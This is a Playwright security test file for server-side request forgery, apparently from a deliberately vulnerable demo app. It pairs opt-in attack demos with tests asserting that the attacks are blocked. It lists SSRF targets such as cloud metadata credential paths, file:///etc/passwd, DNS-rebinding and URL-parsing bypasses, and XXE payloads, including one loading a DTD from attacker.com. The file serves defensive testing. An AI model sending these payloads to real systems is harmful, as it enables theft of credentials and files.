// OWASP Top 10 A10:2021 – Server-Side Request Forgery (SSRF)
import { test, expect } from '../fixtures/zap-fixtures';

test.describe('Server-Side Request Forgery (SSRF) Testing', () => {
  // Mostly API/request tests; avoid auto UI navigation.
  test.use({ autoGoto: false });

  test('VULN DEMO: tests for SSRF via URL parameter', async ({ page }) => {
    console.log(' VULNERABILITY DEMO: Testing SSRF via URL parameter injection');
    
    const ssrfTargets = [
      'http://localhost:22',        // SSH port
      'http://localhost:3306',      // MySQL port  
      'http://127.0.0.1:6379',      // Redis port
      'http://169.254.169.254',     // AWS metadata
      'http://metadata.google.internal', // GCP metadata
      'file:///etc/passwd',         // File protocol
      'http://internal.example.com' // Internal domain
    ];
    
    for (const target of ssrfTargets) {
      try {
        const response = await page.request.post('/api/fetch', {
          data: { url: target }
        });
        
        if (response.status() === 200) {
          const content = await response.text();
          
          if (content.length > 0 && !content.includes('error')) {
            console.log(`WARNING: SSRF successful to ${target}`);
            
            // Check for specific sensitive content
            if (content.includes('root:') || content.includes('AWS')) {
              console.log(`  CRITICAL: Sensitive data retrieved from ${target}`);
            }
          }
        }
      } catch (error) {
        // Network errors are expected for invalid targets
      }
    }
  });

  test('VULN DEMO: tests for SSRF via redirect exploitation', async ({ page }) => {
    console.log(' VULNERABILITY DEMO: Testing SSRF via redirect exploitation');
    
    // Test if application follows redirects to internal resources
    const redirectPayloads = [
      // HTTP redirect to localhost
      `/redirect?target=http://localhost:22`,
      // Protocol downgrade
      `/redirect?target=file:///etc/passwd`,
      // Double encoding
      `/api/fetch?url=http%253A%252F%252F127.0.0.1%253A22`
    ];
    
    for (const payload of redirectPayloads) {
      try {
        const response = await page.request.get(payload);
        
        if (response.status() === 200) {
          console.log(`WARNING: Redirect-based SSRF may be possible via ${payload}`);
        }
      } catch (error) {
        // Expected for most cases
      }
    }
  });

  test('VULN DEMO: tests for blind SSRF via timing attacks', async ({ page }) => {
    test.skip(!process.env.RUN_VULN_TESTS, 'Vulnerability demos are opt-in (set RUN_VULN_TESTS=1)');
    
    const timingTests = [
      { target: 'http://httpbin.org/delay/5', expectedDelay: 5000 },
      { target: 'http://127.0.0.1:1', expectedDelay: 1000 }, // Connection timeout
      { target: 'http://192.168.1.1:80', expectedDelay: 3000 } // Network timeout
    ];
    
    for (const test of timingTests) {
      const startTime = Date.now();
      
      try {
        await page.request.post('/api/fetch', {
          data: { url: test.target },
          timeout: 10000
        });
      } catch (error) {
        // Timeouts expected
      }
      
      const responseTime = Date.now() - startTime;
      
      if (responseTime >= test.expectedDelay * 0.8) {
        console.log(`WARNING: Timing indicates SSRF to ${test.target} (${responseTime}ms)`);
      }
    }
  });

  test('SECURITY EXPECTATION: blocks SSRF attempts to internal resources', async ({ page }) => {
    test.skip(!process.env.SECURE_MODE, 'Run security expectations only after hardening (set SECURE_MODE=1)');
    
    const blockedTargets = [
      'http://localhost',
      'http://127.0.0.1',
      'http://0.0.0.0',
      'http://169.254.169.254',
      'http://[::1]',
      'file:///etc/passwd',
      'ftp://internal.example.com'
    ];
    
    for (const target of blockedTargets) {
      const response = await page.request.post('/api/fetch', {
        data: { url: target }
      });
      
      // Should block internal/localhost requests
      expect([400, 403, 422]).toContain(response.status());
    }
    
    console.log('Internal resource access properly blocked');
  });

  test('SECURITY EXPECTATION: validates URL whitelist enforcement', async ({ page }) => {
    test.skip(!process.env.SECURE_MODE, 'Run security expectations only after hardening (set SECURE_MODE=1)');
    
    // Test that only whitelisted domains are allowed
    const allowedDomains = [
      'https://httpbin.org/get',
      'https://api.github.com/status'
    ];
    
    const blockedDomains = [
      'http://evil.example.com',
      'https://malicious.site',
      'http://localhost:3000'
    ];
    
    // Allowed domains should work
    for (const url of allowedDomains) {
      const response = await page.request.post('/api/fetch', {
        data: { url: url }
      });
      
      expect([200, 201]).toContain(response.status());
    }
    
    // Blocked domains should be rejected
    for (const url of blockedDomains) {
      const response = await page.request.post('/api/fetch', {
        data: { url: url }
      });
      
      expect([400, 403, 422]).toContain(response.status());
    }
    
    console.log('URL whitelist properly enforced');
  });

  test('VULN DEMO: tests for SSRF via XML external entities', async ({ page }) => {
    test.skip(!process.env.RUN_VULN_TESTS, 'Vulnerability demos are opt-in (set RUN_VULN_TESTS=1)');
    
    const xxePayloads = [
      `<?xml version="1.0"?>
       <!DOCTYPE test [
         <!ENTITY xxe SYSTEM "file:///etc/passwd">
       ]>
       <test>&xxe;</test>`,
      
      `<?xml version="1.0"?>
       <!DOCTYPE test [
         <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
       ]>
       <test>&xxe;</test>`,
       
      `<?xml version="1.0"?>
       <!DOCTYPE test [
         <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
         %xxe;
       ]>
       <test>data</test>`
    ];
    
    for (const payload of xxePayloads) {
      const response = await page.request.post('/api/xml', {
        data: payload,
        headers: { 'Content-Type': 'application/xml' }
      });
      
      if (response.status() === 200) {
        const content = await response.text();
        
        if (content.includes('root:') || content.includes('AWS') || content.includes('metadata')) {
          console.log('WARNING: XXE-based SSRF successful - sensitive data exposed');
        }
      }
    }
  });

  test('SECURITY EXPECTATION: prevents XXE-based SSRF attacks', async ({ page }) => {
    test.skip(!process.env.SECURE_MODE, 'Run security expectations only after hardening (set SECURE_MODE=1)');
    
    const xxePayload = `<?xml version="1.0"?>
      <!DOCTYPE test [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <test>&xxe;</test>`;
    
    const response = await page.request.post('/api/xml', {
      data: xxePayload,
      headers: { 'Content-Type': 'application/xml' }
    });
    
    expect([400, 422]).toContain(response.status());
    
    if (response.status() === 200) {
      const content = await response.text();
      expect(content).not.toMatch(/root:|daemon:|bin:/);
    }
    
    console.log('XXE-based SSRF attacks properly prevented');
  });

  test('VULN DEMO: tests for DNS rebinding attacks', async ({ page }) => {
    test.skip(!process.env.RUN_VULN_TESTS, 'Vulnerability demos are opt-in (set RUN_VULN_TESTS=1)');
    
    // Test domains that resolve to localhost (DNS rebinding)
    const rebindingDomains = [
      'http://127.0.0.1.example.com',
      'http://localhost.evil.com',
      'http://0x7f000001.com', // Hex encoding of 127.0.0.1
      'http://2130706433.com'  // Decimal encoding of 127.0.0.1
    ];
    
    for (const domain of rebindingDomains) {
      try {
        const response = await page.request.post('/api/fetch', {
          data: { url: domain }
        });
        
        if (response.status() === 200) {
          console.log(`WARNING: DNS rebinding attack possible via ${domain}`);
        }
      } catch (error) {
        // DNS resolution may fail
      }
    }
  });

  test('SECURITY EXPECTATION: prevents DNS rebinding attacks', async ({ page }) => {
    test.skip(!process.env.SECURE_MODE, 'Run security expectations only after hardening (set SECURE_MODE=1)');
    
    const rebindingDomains = [
      'http://127.0.0.1.example.com',
      'http://localhost.evil.com',
      'http://0x7f000001.com',
      'http://2130706433.com'
    ];
    
    for (const domain of rebindingDomains) {
      const response = await page.request.post('/api/fetch', {
        data: { url: domain }
      });
      
      // Should block suspicious domains
      expect([400, 403, 422]).toContain(response.status());
    }
    
    console.log('DNS rebinding attacks properly prevented');
  });

  test('validates proper URL parsing and validation', async ({ page }) => {
    const edgeCaseUrls = [
      'http://example.com@127.0.0.1',     // User info bypass
      'http://127.0.0.1:80@example.com',  // Port confusion
      'http://example.com#@127.0.0.1',    // Fragment bypass
      'http://127.1',                     // Incomplete IP
      'http://[::ffff:127.0.0.1]',       // IPv6 mapped IPv4
      'http://0177.0.0.1',               // Octal encoding
    ];
    
    console.log('URL Parsing Edge Cases Test:');
    
    for (const url of edgeCaseUrls) {
      try {
        const response = await page.request.post('/api/validate-url', {
          data: { url: url }
        });
        
        console.log(`  ${url}: ${response.status() === 200 ? '✅ Accepted' : ' Rejected'}`);
      } catch (error) {
        if (error instanceof Error) {
          console.log(`  ${url}:  Error - ${error.message}`);
        } else {
          console.log(`  ${url}:  Error - ${String(error)}`);
        }
      }
    }
  });

  test('VULN DEMO: tests for SSRF via image processing', async ({ page }) => {
    test.skip(!process.env.RUN_VULN_TESTS, 'Vulnerability demos are opt-in (set RUN_VULN_TESTS=1)');
    
    // Test if image processing endpoints can be used for SSRF
    const imageUrls = [
      'http://127.0.0.1:22/image.jpg',  // Internal service
      'file:///etc/passwd.jpg',         // File protocol
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    ];
    
    for (const imageUrl of imageUrls) {
      try {
        const response = await page.request.post('/api/process-image', {
          data: { imageUrl: imageUrl }
        });
        
        if (response.status() === 200) {
          console.log(`WARNING: Image processing SSRF to ${imageUrl}`);
        }
      } catch (error) {
        // Expected for most invalid images
      }
    }
  });

});